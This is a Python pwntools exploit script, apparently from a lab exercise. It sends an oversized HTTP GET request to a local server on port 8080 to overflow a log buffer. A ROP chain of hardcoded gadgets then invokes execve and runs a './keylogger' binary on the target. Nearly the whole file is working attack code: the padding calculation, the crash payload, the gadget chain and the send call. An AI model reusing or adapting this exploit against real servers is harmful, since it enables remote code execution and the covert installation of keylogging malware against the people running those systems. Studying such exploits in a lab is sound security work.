from keystone import *
from pwn import *
from struct import pack

### CONFIGS ###µ
rop_chain_start = 0x7ffff7ad1dd1

port = 8080
original_rbp = 0x7ffff7ad1920 
log_buffer_rbp_offset = 0x450 
log_buffer_prefix = 49 
address_of_server_data = 0x0000000000404502

input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) 
crash += b"q" * padding_size 
crash += 0xffffffffffffffff.to_bytes(8, "little") 
crash += b"\r\n\r\n"

keylogger = b"./keylogger"
keylogger_len = len(keylogger)
keylogger_start_address = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len
print(keylogger_start_address)

p = pack("<Q", 0x000000000040398b) # pop rdi ; ret
p += pack("<Q", keylogger_start_address)     # the addres of the ./server_data string

p += pack("<Q", 0x0000000000403989) # pop rsi ; pop r15 ; ret
p += pack("<Q", 0x0000000000000000) # null byte for rsi
p += pack("<Q", 0xdeadbeafdeadbeaf) # paddinp
p += pack("<Q", 0x00000000004036da) # pop rdx ; pop rax ; ret
p += pack("<Q", 0x0000000000000000) # null byte for rdx
p += pack("<Q", 0xdeadbeafdeadbeaf) # paddinp
p += pack("<Q", 0x00000000004036db) # pop rax ; ret
p += pack("<Q", 0x000000000000003b) # syscall number (59) for rax
p += pack("<Q", 0x00000000004036fb) # syscall

sc1_exploit = message_prefix
sc1_exploit += keylogger
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc1_exploit)
sc1_exploit += b"q" * padding_size
sc1_exploit += rop_chain_start.to_bytes((rop_chain_start.bit_length() + 7) // 8, byteorder = "little")
sc1_exploit += b"\r\n\r\n"
sc1_exploit += p

# print(sc1_exploit)

### PERFORM ATTACK ###
# remote("localhost", port).send(crash)
sleep(2) 
remote("localhost", port).send(sc1_exploit)
